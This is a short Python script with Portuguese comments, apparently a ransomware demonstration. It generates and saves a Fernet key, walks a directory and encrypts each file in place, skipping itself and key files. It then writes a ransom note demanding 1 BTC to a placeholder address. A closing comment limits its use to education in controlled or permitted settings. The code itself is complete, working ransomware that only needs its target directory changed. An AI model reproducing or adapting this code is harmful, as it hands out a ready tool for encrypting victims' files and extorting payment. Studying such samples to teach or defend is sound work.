from cryptography.fernet import Fernet 
import os 

# gerar chave de criptografia e salvar 

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# carregar chave salva 

def carregar_chave():
    return open("chave.key", "rb").read()

#criptografar um unico arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# encontrar arquivos para criptografar 

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransonware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# mensagem de resgate 

def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1btc para endereço X e envie o comprovante!\n")
        f.write("Depois disso, envaremos a chave para você recuperar seus dados")

# execução principal

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptogravados!")

if __name__=="__main__":
    main()

# Utilizar para fins educativos e em ambiente controlados e ou com permissão.
